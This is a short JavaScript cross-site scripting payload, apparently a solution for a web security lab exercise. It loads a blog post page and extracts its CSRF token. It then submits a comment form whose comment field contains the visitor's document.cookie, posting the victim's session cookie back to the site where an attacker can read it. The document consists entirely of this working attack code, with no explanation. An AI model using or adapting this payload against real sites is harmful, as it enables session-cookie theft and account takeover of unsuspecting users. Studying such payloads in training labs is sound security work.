var request = new XMLHttpRequest();
request.responseType = "document"
request.open("GET", "/post?postId=7", true);

request.onload = function(e) {
  var csrf = e.target.response['body'].querySelectorAll('[name="csrf"]')[0].value;
  
  data = "csrf=" + csrf + "&postId=7&comment=" + document.cookie + "&name=victim&email=victim@victim.com&website=http://victim.com"
  
  var request = new XMLHttpRequest();
  request.open("POST", "/post/comment", true);
  request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  request.send(data);
}
request.send();
